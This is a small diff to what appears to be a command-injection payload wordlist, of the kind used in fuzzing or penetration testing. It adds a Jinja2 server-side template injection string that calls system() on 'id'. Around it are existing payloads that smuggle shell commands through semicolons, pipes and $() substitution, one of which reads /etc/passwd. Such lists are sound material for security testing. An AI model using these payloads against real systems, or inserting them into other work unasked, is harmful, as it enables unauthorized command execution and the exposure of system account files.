@@ -1,5 +1,6 @@
 ";id;"
 "|/usr/bin/id|"
+{{['id']|map('system')|join}}
 "|id|"
 "||/usr/bin/id|"
 $(`cat /etc/passwd`)
